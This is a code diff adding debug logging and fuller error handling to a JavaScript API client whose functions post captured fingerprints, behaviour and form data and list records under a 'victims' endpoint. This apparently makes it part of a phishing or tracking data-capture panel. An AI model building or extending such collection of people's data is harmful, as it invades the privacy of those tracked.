@@ -13,7 +13,17 @@ const API_BASE = import.meta.env.VITE_API_URL || '';
  */
 export async function captureData(data) {
   try {
-    const response = await fetch(`${API_BASE}/api/capture`, {
+    const url = `${API_BASE}/api/capture`;
+    console.log('📡 [API] Capturing data to:', url);
+    console.log('📡 [API] Payload:', {
+      hasFingerprint: !!data.fingerprints,
+      hasBehavior: !!data.behavior,
+      hasMetadata: !!data.metadata,
+      userSubmitted: data.metadata?.userSubmitted,
+      email: data.metadata?.formData?.email ? '***' : null
+    });
+
+    const response = await fetch(url, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -21,13 +31,19 @@ export async function captureData(data) {
       body: JSON.stringify(data),
     });
 
+    console.log('📡 [API] Capture response status:', response.status);
+
     if (!response.ok) {
-      throw new Error(`HTTP error! status: ${response.status}`);
+      const errorText = await response.text();
+      console.error('📡 [API] Capture error response:', errorText);
+      throw new Error(`HTTP ${response.status}: ${errorText || response.statusText}`);
     }
 
-    return await response.json();
+    const result = await response.json();
+    console.log('📡 [API] Capture result:', result);
+    return result;
   } catch (error) {
-    console.error('Error capturing data:', error);
+    console.error('📡 [API] Error capturing data:', error);
     throw error;
   }
 }
@@ -38,15 +54,24 @@ export async function captureData(data) {
  */
 export async function fetchStats() {
   try {
-    const response = await fetch(`${API_BASE}/api/stats`);
+    const url = `${API_BASE}/api/stats`;
+    console.log('📡 [API] Fetching stats from:', url);
+
+    const response = await fetch(url);
+
+    console.log('📡 [API] Stats response status:', response.status);
 
     if (!response.ok) {
-      throw new Error(`HTTP error! status: ${response.status}`);
+      const errorText = await response.text();
+      console.error('📡 [API] Stats error response:', errorText);
+      throw new Error(`HTTP ${response.status}: ${errorText || response.statusText}`);
     }
 
-    return await response.json();
+    const data = await response.json();
+    console.log('📡 [API] Stats data received:', data);
+    return data;
   } catch (error) {
-    console.error('Error fetching stats:', error);
+    console.error('📡 [API] Error fetching stats:', error);
     throw error;
   }
 }
@@ -60,17 +85,27 @@ export async function fetchStats() {
  */
 export async function fetchVictims(page = 1, limit = 20, sort = '-timestamp') {
   try {
-    const response = await fetch(
-      `${API_BASE}/api/victims?page=${page}&limit=${limit}&sort=${sort}`
-    );
+    const url = `${API_BASE}/api/victims?page=${page}&limit=${limit}&sort=${sort}`;
+    console.log('📡 [API] Fetching victims from:', url);
+
+    const response = await fetch(url);
+
+    console.log('📡 [API] Victims response status:', response.status);
 
     if (!response.ok) {
-      throw new Error(`HTTP error! status: ${response.status}`);
+      const errorText = await response.text();
+      console.error('📡 [API] Victims error response:', errorText);
+      throw new Error(`HTTP ${response.status}: ${errorText || response.statusText}`);
     }
 
-    return await response.json();
+    const data = await response.json();
+    console.log('📡 [API] Victims data received:', {
+      count: data.victims?.length || 0,
+      pagination: data.pagination
+    });
+    return data;
   } catch (error) {
-    console.error('Error fetching victims:', error);
+    console.error('📡 [API] Error fetching victims:', error);
     throw error;
   }
 }
